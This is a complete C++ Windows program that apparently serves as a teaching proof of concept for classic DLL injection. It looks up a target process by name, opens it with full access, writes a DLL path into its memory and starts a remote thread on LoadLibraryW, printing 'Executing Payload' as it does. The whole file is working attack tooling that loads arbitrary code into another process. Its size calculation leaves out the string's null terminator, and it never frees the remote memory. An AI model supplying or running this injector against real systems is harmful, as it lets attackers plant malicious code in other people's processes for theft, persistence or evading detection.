#include <windows.h>
#include <tlhelp32.h>
#include <cstdio>
#include <cwchar>
#include <iostream>

// Injection function using wide-character strings
BOOL InjectDllToRemoteProcess(HANDLE hProcess, LPWSTR DllName) {
    BOOL bSTATE = TRUE;
    FARPROC pLoadLibraryW = NULL;
    LPVOID pAddress = NULL;
    DWORD dwSizeToWrite = lstrlenW(DllName) * sizeof(WCHAR);
    SIZE_T lpNumberOfBytesWritten = 0;
    HANDLE hThread = NULL;

    // Get the address of LoadLibraryW using a Unicode-aware call.
    pLoadLibraryW = GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "LoadLibraryW");
    if (pLoadLibraryW == NULL) {
        wprintf(L"[!] GetProcAddress() Failed with Error: %d\n", GetLastError());
        bSTATE = FALSE; 
        goto _EndOfFunction;
    }

    // Allocate memory in the remote process for the DLL path.
    pAddress = VirtualAllocEx(hProcess, NULL, dwSizeToWrite, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pAddress == NULL) {
        wprintf(L"[!] VirtualAllocEx() Failed with Error: %d\n", GetLastError());
        bSTATE = FALSE; 
        goto _EndOfFunction;
    }

    wprintf(L"[!] pAddress Allocated At : 0x%p Of Size: %d\n", pAddress, dwSizeToWrite);
    wprintf(L"[#] Press <Enter> To Write ...\n");
    getchar();

    // Write the DLL name into the allocated memory.
    if (!WriteProcessMemory(hProcess, pAddress, DllName, dwSizeToWrite, &lpNumberOfBytesWritten) || 
        lpNumberOfBytesWritten != dwSizeToWrite) {
        wprintf(L"[!] WriteProcessMemory() Failed With Error: %d\n", GetLastError());
        bSTATE = FALSE; 
        goto _EndOfFunction;
    }

    wprintf(L"[!] WriteProcessMemory() Success: written %d Bytes\n", lpNumberOfBytesWritten);
    wprintf(L"[#] Press <Enter> to Run ... \n");
    getchar();

    wprintf(L"[!] Executing Payload ...\n");

    // Create a remote thread that calls LoadLibraryW with pAddress as parameter.
    hThread = CreateRemoteThread(hProcess, NULL, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(pLoadLibraryW), pAddress, 0, NULL);
    if (hThread == NULL) {
        wprintf(L"[!] CreateRemoteThread() Failed with Error: %d\n", GetLastError());
        bSTATE = FALSE; 
        goto _EndOfFunction;
    }

_EndOfFunction:
    if (hThread)
        CloseHandle(hThread);
    return bSTATE;
}

// Retrieves a handle to the remote process by name using wide-character functions
BOOL GetRemoteProcessHandle(LPWSTR szProcessName, DWORD* dwProcessId, HANDLE* hProcess) {
    HANDLE hSnapShot = NULL;
    PROCESSENTRY32W Proc;
    Proc.dwSize = sizeof(PROCESSENTRY32W);

    hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapShot == INVALID_HANDLE_VALUE) {
        wprintf(L"[!] CreateToolhelp32Snapshot() Failed with Error: %d\n", GetLastError());
        goto _EndOfFunction;
    }

    if (!Process32FirstW(hSnapShot, &Proc)) {
        wprintf(L"[!] Process32FirstW() Failed with Error: %d\n", GetLastError());
        goto _EndOfFunction;
    }

    do {
        WCHAR LowerName[MAX_PATH * 2] = {0};
        if (Proc.szExeFile) {
            std::wcout << L"[i] Process Name: " << Proc.szExeFile << std::endl;
            DWORD dwSize = lstrlenW(Proc.szExeFile);

            DWORD i = 0;

            if (dwSize < MAX_PATH * 2) {
                for (; i < dwSize; i++) {
                    LowerName[i] = towlower(Proc.szExeFile[i]);
                }
                LowerName[i] = L'\0';
            }
        }

        if (wcscmp(LowerName, szProcessName) == 0) {
            *dwProcessId = Proc.th32ProcessID;
            *hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Proc.th32ProcessID);
            if (*hProcess == NULL) {
                wprintf(L"[!] OpenProcess() Failed with Error: %d\n", GetLastError());
                goto _EndOfFunction;
            }
            break;
        }
    } while (Process32NextW(hSnapShot, &Proc));

_EndOfFunction:
    if (hSnapShot)
        CloseHandle(hSnapShot);
    if (*dwProcessId == 0 || *hProcess == NULL)
        return FALSE;
    return TRUE;
}

// Entry point using wide-character parameters
int wmain(int argc, wchar_t* argv[]) {
    HANDLE hProcess = NULL;
    DWORD dwProcessId = 0;

    if (argc < 3) {
        wprintf(L"[!] Usage: %s <DllPath> <ProcessName>\n", argv[0]);
        return -1;
    }

    wprintf(L"[i] Searching For Process Id Of \"%s\" ... ", argv[2]);
    if (!GetRemoteProcessHandle(argv[2], &dwProcessId, &hProcess)) {
        wprintf(L"[!] Process is Not Found\n");
        return -1;
    }
    wprintf(L"[+] DONE\n");
    wprintf(L"[i] Found Target Process Pid: %d\n", dwProcessId);

    // Inject the DLL
    if (!InjectDllToRemoteProcess(hProcess, argv[1])) {
        return -1;
    }

    CloseHandle(hProcess);
    wprintf(L"[#] Press <Enter> To Quit ... ");
    getchar();
    return 0;
}